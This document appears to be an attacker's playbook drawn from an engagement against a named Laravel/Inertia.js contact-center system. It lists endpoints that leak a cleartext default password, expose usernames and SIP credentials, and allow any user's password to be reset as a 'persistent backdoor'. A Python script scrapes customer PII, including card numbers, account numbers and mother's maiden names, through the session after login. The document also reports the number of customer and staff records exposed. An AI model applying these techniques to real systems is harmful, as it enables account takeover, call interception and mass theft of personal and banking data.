# Laravel Inertia.js Contact Center Attack Patterns

## Source: BlueSpider engagement (June 2026, aosgraha.com)

## Key Architecture Pattern

Laravel + Inertia.js + Vue 3 apps expose rich data through:
1. **Ziggy route dump** in page source (inline `<script>` with all routes)
2. **Inertia `data-page` attribute** containing full props (auth, tokens, SIP config)
3. **Dual auth layers**: session cookies for Inertia/web, separate token for /api/* external CRM

## Critical Endpoints to Test

### Config Parameter Endpoints
```
/api/get-params/{type}     → brute-force types: passDefault, CATEGORY, STATUS, etc.
/api/get-params-inbound/{type}  → VERIFIKASI, CATEGORY, STATUS
```
`passDefault` returns the system's default password in cleartext. Combined with user enum = ATO.

### User Enumeration
```
/api/user-combo-username   → returns all usernames + full names (often unauth)
/api/user-combo            → may return additional user data
/api/get-agent             → agent list with status
```

### Authenticated Data (post-login via Inertia props)
The dashboard `data-page` JSON contains:
- `props.auth.user` — full user object (id, username, email, userLevel, team)
- `props.auth.sip` — SIP/WebRTC credentials (dnPassword, websocket URL, realm)
- `props.auth.tac` — TAC code for call routing
- `props.checkToken.token` — session validation token

### Dashboard Status Endpoints (session-cookie auth)
```
/dashboardStatus/inboundStatus/{filter}
/dashboardStatus/agentActivities/{filter}
/dashboardStatus/inboundQueueDetail/{filter}
/dashboardStatus/longestCallWait/{filter}
/dashboardStatus/avgDisconectTime/{filter}
/dashboardStatus/inboundChart/{filter}
```
These use Laravel session auth (not API token). Pass `-` as filter for all data.

### Pitfall: Login Response Codes Vary by Version
- 302 → /dashboard = success (older Laravel, session-based redirect)
- 204 = success (newer API-style)
- 422 = wrong credentials
- 429 = rate limited
- 419 = CSRF mismatch

### Pitfall: Cookie Name Varies Per Instance
The session cookie name is NOT always `bluespidev_session`. It's derived from the APP_NAME config:
- `bluespider_contact_center_session` (prod/dev-bsjago)
- Custom names on other instances
Always use a requests.Session() or cookie jar rather than hardcoding cookie names.

## SIP/PBX Exploitation
Post-auth Inertia props leak:
- `dnPassword` — SIP registration password
- `websocket_server_url` — WebSocket PBX endpoint
- `realm` — SIP domain
- `user_dn` — extension number

With these, register a SIP client and intercept/make calls.

## Ignition Debug Pattern
Multiple dev-* subdomains share same codebase. Check ALL for:
```
/_ignition/health-check → {"can_execute_commands":true}
/_ignition/execute-solution → 403 (IP restricted) or 500 (exploitable)
```
Execute-solution is typically IP-whitelisted but health-check confirms debug mode.

## CORS Pattern
Laravel apps often set `Access-Control-Allow-Origin: *` on /api/* routes.
This enables cross-origin theft of any unauth-accessible data.

## Post-Exploitation: Inertia Pages as Data Source

When /api/* endpoints reject your CRM token (401), use **session-cookie auth + Inertia page visits** instead. The app embeds full datasets in `data-page` props on page load.

### Technique: Extract data from Inertia page props
```python
import requests, re, html as htmlmod, json
s = requests.Session()
s.verify = False
# Login (creates session cookie)
r = s.get("https://target/login")
token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
s.post("https://target/login", data={"_token": token, "email": "...", "password": "..."})
# Access any page — data comes in props
r = s.get("https://target/customer-profile")
m = re.search(r'data-page="([^"]+)"', r.text)
data = json.loads(htmlmod.unescape(m.group(1)))
customer_data = data['props']['custData']['customer']
# PITFALL: 'customer' can be a plain list OR a paginated dict with 'data' key
# depending on host/version. Always handle both:
if isinstance(customer_data, dict) and 'data' in customer_data:
    customers = customer_data['data']
elif isinstance(customer_data, list):
    customers = customer_data
else:
    customers = []
```

### Key Inertia routes (session auth, not API token):
```
/customer-profile         → custData (all customer records + columns)
/customer-profile/{id}    → cust (full PII: phone1, phone2, cifNo, cardNo, accNo, mmn, docId) + tickets
/abandon-list             → DataAbandon (call logs with phone numbers)
/database-maintenance     → custOutbound + listCampaign (outbound customer DB)
/chat                     → waTemplate (WhatsApp templates)
/contact-handler          → DataFollowUp
/contact-handler/{tid}    → custDataByTicket (customer PII linked to ticket)
/user-management          → agentList (all staff: email, level, team, agentCode) [SA only]
/report                   → Report/Index
```

### Super Admin Persistence Endpoints (critical for post-exploit):
```
POST /api/reset-default-password  {"user_id": <any>}  → resets ANY user's pw to default
DELETE /api/user-release/{id}                          → force logout ANY active agent
GET /api/get-ticket-list                               → live tickets (session auth)
```

### Post-Exploitation Impact Metrics (BlueSpider PROD):
- 41,077 customer profiles (each with phone via /customer-profile/{id})
- 166 staff accounts (147 @jago.com corporate emails)
- 499 outbound campaign records
- Real-time dashboard monitoring of all agent activity
- Password reset = persistent backdoor (no user notification)

### Pitfall: Dual-Auth Confusion
The CRM token from `props.checkToken.token` does NOT work as Bearer for most /api/* endpoints.
These endpoints require a DIFFERENT token issued by the external CRM system.
Session cookies (from login) work for Inertia pages + some /api/* endpoints (get-ticket-list).
When Bearer fails with 401, try same endpoint with just session cookies + X-Requested-With header.
